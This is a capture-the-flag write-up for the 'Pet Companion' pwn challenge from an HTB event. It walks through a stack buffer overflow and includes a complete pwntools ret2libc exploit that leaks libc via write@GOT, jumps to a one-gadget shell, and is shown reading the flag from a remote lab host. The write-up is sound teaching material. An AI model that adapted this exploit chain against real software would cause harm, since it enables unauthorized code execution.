# Pet Companion

## Description

> Embark on a journey through this expansive reality, where survival hinges on battling foes. In your quest, a loyal companion is essential. Dogs, mutated and implanted with chips, become your customizable allies. Tailor your pet's demeanor—whether happy, angry, sad, or funny—to enhance your bond on this perilous adventure.
>
> [Attached file](./challenge)

Tags: _Pwn_ \
Difficulty: _easy_ \
Points: _300_

## Recognition phase

Running the usual exploratory commands:

```
$ file pet_companion
pet_companion: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter ./glibc/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=09278a4ec751302c94acb15b561c1a2f4ca2182f, not stripped
```
```
$ checksec pet_companion                                                       
[*] '/home/jovenoven/Downloads/ctf/cyberApocalypse2024_HTB/pwn/pet_companion/pet_companion'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
    RUNPATH:  b'./glibc/'
```

Note that ``Stack Canaries`` and ``PIE`` are disabled so we can potentially leverage a ``Stack Buffer Overflow`` easily and leak addresses statically from within the `ELF` file.

```c
undefined8 main(void)

{
  undefined8 local_48;
  undefined8 local_40;
  undefined8 local_38;
  undefined8 local_30;
  undefined8 local_28;
  undefined8 local_20;
  undefined8 local_18;
  undefined8 local_10;
  
  setup();
  local_48 = 0;
  local_40 = 0;
  local_38 = 0;
  local_30 = 0;
  local_28 = 0;
  local_20 = 0;
  local_18 = 0;
  local_10 = 0;
  write(1,"\n[!] Set your pet companion\'s current status: ",0x2e);
  read(0,&local_48,0x100);
  write(1,"\n[*] Configuring...\n\n",0x15);
  return 0;
}
```

## Finding the bug

Basically the program reads up to `0x100` bytes from the user input and stores it in an 8 bytes sized variable, so there is notably a `Buffer Overflow` bug, we can corroborate it by running the program and insert a large string:

```
$ ./pet_companion                                                              

[!] Set your pet companion's current status: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

[*] Configuring...

Segmentation fault
```

## Exploitation phase

At this point, with a Buffer Overflow (BOF) and Position Independent Executable (PIE) disabled, we can execute any function available inside the binary or in the Global Offset Table (GOT PLT). Unfortunately, in this challenge, we don't have a function that prints the flag or gives us a shell, so this time we have to be a bit more clever. The only potentially useful function that we have is ``write()``. With ``write()``, we can read any value from within the binary. This is especially useful because we could leak a ``libc`` function address from the ``GOT PLT`` and calculate the ``libc`` base address with that. Having a ``libc`` base address leak gives us a lot of power because we can call any function and gadget inside ``libc``. For example, we could call ``system(/bin/sh)`` or a ``One Gadget`` to spawn a shell. So the plan is to use the buffer overflow bug to call ``write()`` and leak the ``libc`` address, then call ``main()`` again to be able to do another buffer overflow. But this time, we will have all libc functions and one gadgets at our disposal.

To achieve our goal, we need to start calculating the offset of our buffer overflow. I will use ``cyclic`` from within ``pwndgb`` for this task.

```
$ gdb pet_companion                                       GNU gdb (Debian 13.2-1) 13.2

...

pwndbg> cyclic 100
aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaa
pwndbg> r
Starting program: /home/jovenoven/...                                                           

[!] Set your pet companion's current status: aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaa

[*] Configuring...

Program received signal SIGSEGV, Segmentation fault.
0x00000000004006df in main ()

...

──────────────────────[ DISASM / x86-64 / set emulate on ]───────────────────────
 ► 0x4006df <main+149>    ret    <0x616161616161616a>

...

pwndbg> cyclic -l 0x616161616161616a
Finding cyclic pattern of 8 bytes: b'jaaaaaaa' (hex: 0x6a61616161616161)
Found at offset 72
```

Before being able to call ``write()``, we have to find a gadget to set the register ``RSI`` with the address of ``write()`` in the ``GOT`` section, which will be treated as the first parameter of the function. I used ``ropper`` for that task.

```
$ ropper --file pet_companion                                                  
[INFO] Load gadgets from cache
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%

Gadgets
=======
...

0x0000000000400741: pop rsi; pop r15; ret;

...

93 gadgets found
```

That is the unique ``pop rsi`` gadget that ``ropper`` found, it comes with a ``pop r15`` so we will just put garbage in that register.

For the last part of our exploit I will use the `one_gadget` tool to find a `One Gadget`:

```
$ one_gadget $(ldd pet_companion | grep libc.so | cut -d' ' -f3)            
0x4f2a5 execve("/bin/sh", rsp+0x40, environ)
constraints:
  rsp & 0xf == 0
  rcx == NULL

0x4f302 execve("/bin/sh", rsp+0x40, environ)
constraints:
  [rsp+0x40] == NULL

0x10a2fc execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL
```

With all this information we can now write our final exploit.

```Python
#!/usr/bin/python3
from pwn import *

# Set up the target binary by specifying the ELF file
elf = context.binary = ELF("pet_companion")
libc = ELF(elf.runpath + b"/libc.so.6")

# Defining the GDB script that will be used when running the binary with the GDB parameter
gs = '''
continue
'''
# Launch the binary with GDB, without GDB or REMOTE based on the command-line arguments
def start():
    if args.REMOTE:
        return remote("94.237.53.58", 49979)
    else:
        if args.GDB:
            return gdb.debug(elf.path, gdbscript=gs)
        else:
            return process(elf.path)

io = start()

#============================================================
#                    EXPLOIT GOES HERE
#============================================================

#=-=-=- USE BOF TO LEAK LIBC -=-=-=

pop_rsi_r15 = 0x400741
# Set the first argument of the write function in register RSI
# as the address of the same write function to leak its address,
# set R15 to any value, then call write function and finally
# call main to use BOF again later
payload = b"A"*72 + \
          p64(pop_rsi_r15) + p64(elf.got.write) + p64(0x0) + \
          p64(elf.plt.write) + \
          p64(elf.sym.main)
io.sendlineafter(b": ", payload)
data =  io.recvuntil(b'[!] Set your pet companion\'s current status: ')
# Extract the write address from the response and calculate the
# libc base address by subtracting the write function offset
# to the leaked address
libc.address = u64(data[21:29]) - libc.sym.write
info("libc @ 0x%x", libc.address)


#=-=-=- USE BOF AGAIN TO DO A RET2LIBC ATTACK -=-=-=

# Call a one gadget from libc
io.sendline(b"A"*72 + p64(libc.address + 0x4f302))

#============================================================

# Interact with the process
io.interactive()
```

```
$ ./xpl.py REMOTE                                                 

...

[+] Opening connection to 94.237.63.235 on port 49131: Done
[*] libc @ 0x7ff7119cd000
[*] Switching to interactive mode

[*] Configuring...

$ ls
flag.txt
glibc
pet_companion
$ cat flag.txt
HTB{c0nf1gur3_w3r_d0g}
```

\
Flag `HTB{c0nf1gur3_w3r_d0g}`
